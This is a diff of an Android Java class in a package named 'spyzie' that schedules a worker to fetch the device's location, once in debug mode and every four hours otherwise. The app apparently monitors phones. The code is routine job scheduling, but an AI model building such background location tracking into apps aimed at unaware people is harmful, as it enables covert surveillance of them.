@@ -9,6 +9,7 @@ import androidx.work.OneTimeWorkRequest;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
+import com.tantd.spyzie.data.device.worker.GetLocationWorker;
 import com.tantd.spyzie.di.ApplicationContext;
 import com.tantd.spyzie.util.Constants;
 
@@ -23,7 +24,7 @@ public class AppDeviceDataManager implements DeviceDataManager {
     Context mContext;
 
     private static final int UPDATE_PERIOD = 4;
-    private static final String QUERY_DEVICE_DATA_NAME = "QUERY_DEVICE_DATA_NAME";
+    private static final String FETCH_DEVCIE_LOCATION = "FETCH_DEVCIE_LOCATION";
 
     private static AppDeviceDataManager sInstance;
 
@@ -38,7 +39,7 @@ public class AppDeviceDataManager implements DeviceDataManager {
     }
 
     private AppDeviceDataManager() {
-        Data input = new Data.Builder().putInt("start_input", 3).putInt("count", 9).build();
+        Data input = new Data.Builder().putInt("start_input", 3).putInt("count", 60).build();
         mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(GetLocationWorker.class).setInputData(input).build();
         mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(GetLocationWorker.class, UPDATE_PERIOD, TimeUnit.HOURS).build();
     }
@@ -47,7 +48,7 @@ public class AppDeviceDataManager implements DeviceDataManager {
     public void startFetchingDeviceData() {
         Log.d(Constants.LOG_TAG, "[AppDeviceDataManager] startFetchingDeviceData");
         if (Constants.IS_DEBUG_MODE) {
-            WorkManager.getInstance(mContext).enqueueUniqueWork(QUERY_DEVICE_DATA_NAME, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
+            WorkManager.getInstance(mContext).enqueueUniqueWork(FETCH_DEVCIE_LOCATION, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
         } else {
 
         }
